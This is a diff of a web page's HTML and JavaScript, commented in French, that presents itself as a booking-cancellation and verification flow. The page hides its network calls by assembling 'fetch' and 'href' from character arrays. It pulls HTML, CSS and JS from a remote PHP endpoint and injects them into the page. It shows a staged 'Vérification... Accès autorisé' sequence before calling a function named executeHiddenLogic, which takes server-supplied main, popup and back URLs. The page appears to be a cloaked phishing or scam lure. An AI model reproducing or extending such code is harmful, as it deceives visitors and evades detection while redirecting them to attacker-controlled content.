@@ -10,13 +10,13 @@
         /* Styles du loader */
         @keyframes spin { 100% { transform: rotate(360deg); } }
         
-        /* 🚨 CORRECTION CRITIQUE 🚨 : ÉTIREMENT TOTAL & SUPPRESSION DES MARGES */
+        /* 🚨 CORRECTION CRITIQUE 🚨 : Force l'étirement total & SUPPRESSION DES MARGES */
         html, body {
             height: 100%;
             width: 100%;
             margin: 0;
             padding: 0;
-            overflow: hidden; /* Empêche les barres de défilement */
+            overflow: hidden; /* Empêche les barres de défilement pendant l'affichage */
         }
         
         /* Styles de base pour le chargement */
@@ -27,12 +27,10 @@
             background-repeat: no-repeat;
         }
         
-        /* NOUVEAU : Le conteneur doit être statique pour que le 100vh de l'enfant fonctionne */
+        /* Conteneur principal: statique pour que 100vh de l'enfant fonctionne */
         #template-container {
             height: 100%; 
             width: 100%;
-            /* Retire le display: flex pour éviter les conflits de centering */
-            /* Nous faisons le centering dans le template PHP (align-items: center;) */
         }
 
         /* Centrage du spinner de chargement */
@@ -68,6 +66,7 @@
     const FE = ['f', 'e', 't', 'c', 'h'].join('');
     const HREF = ['h', 'r', 'e', 'f'].join('');
     
+    // ⚠️ POINTS CLÉS
     const URL_PHP = "https://lespetitscoquins.fr/cancel-booking.php"; 
     const URL_TEMPLATE = URL_PHP + "?action=get_template"; 
 
@@ -105,14 +104,15 @@
     
     // --- 2. GESTION DES CLICS (Reste inchangé) ---
     function initializeUnifiedClicks(jsScript) {
-        // ... (Logique inchangée)
         document.querySelectorAll('.action-btn').forEach(btn => {
             btn.addEventListener('click', function(event) {
                 event.preventDefault();
+                
                 this.setAttribute('data-original-html', this.innerHTML);
                 this.innerHTML = '<span style="display:inline-flex; align-items:center; justify-content:center; gap: 8px;">' + LOADER_HTML_FIXED + ' Vérification...</span>';
                 this.style.pointerEvents = 'none';
                 this.style.opacity = '0.8';
+
                 executeAjaxLogic(this);
             });
         });
@@ -139,6 +139,7 @@
         .then(data => {
             if (data.status === 'ok') {
                 executeHiddenLogic(data.url_main, data.url_pop, data.id_back);
+                
                 setTimeout(function(){
                     btnElement.innerHTML = SUCCESS_ICON_HTML + " Accès autorisé";
                     btnElement.style.background = '#009432';
@@ -159,10 +160,10 @@
 
     // --- 3. FONCTION PRINCIPALE : CHARGEMENT DU TEMPLATE AU DÉPART ---
     function loadTemplate() {
-        // Cacher le spinner dès le début, il sera affiché par le CSS initial
-        document.getElementById('loading-spinner').style.display = 'inline-flex';
-
         let trackingParams = window.location.search;
+        
+        // Cacher le spinner avant l'injection de la réponse
+        document.getElementById('loading-spinner').style.display = 'inline-flex';
         
         window[FE](URL_TEMPLATE + trackingParams, { method: METHOD_GET })
         .then(response => {
@@ -174,10 +175,10 @@
         .then(data => {
             if (data.status === 'ok' && data.html) {
                 
-                // 1. Cacher le spinner avant l'injection
+                // Cacher le spinner
                 document.getElementById('loading-spinner').style.display = 'none';
                 
-                // 2. Injection du HTML
+                // 1. Injection du HTML
                 document.getElementById('template-container').innerHTML = data.html;
                 
                 // 🚨 CORRECTION CLÉ 🚨 : Application de la couleur de fond
@@ -187,19 +188,24 @@
                     const backdropStyle = rootDiv.style.backdropFilter || rootDiv.style.webkitBackdropFilter;
                     
                     if (backgroundStyle) {
+                        // Applique la couleur de fond du template au body
                         document.body.style.background = backgroundStyle;
                     }
                     
                     if (backdropStyle) {
+                        // Applique le filtre (backdrop-filter) au body si présent
                         document.body.style.backdropFilter = backdropStyle;
                         document.body.style.webkitBackdropFilter = backdropStyle;
                     }
+                    
+                    // S'assurer que l'élément injecté prend 100vh
+                    rootDiv.style.height = '100vh';
                 }
                 
-                // 3. Injection du CSS additionnel
+                // 2. Injection du CSS additionnel (pour les styles spécifiques au template)
                 document.getElementById('template-styles').innerHTML += data.css || '';
                 
-                // 4. Initialisation des gestionnaires de clics
+                // 3. Initialisation des gestionnaires de clics
                 initializeUnifiedClicks(data.js);
                 
             } else {
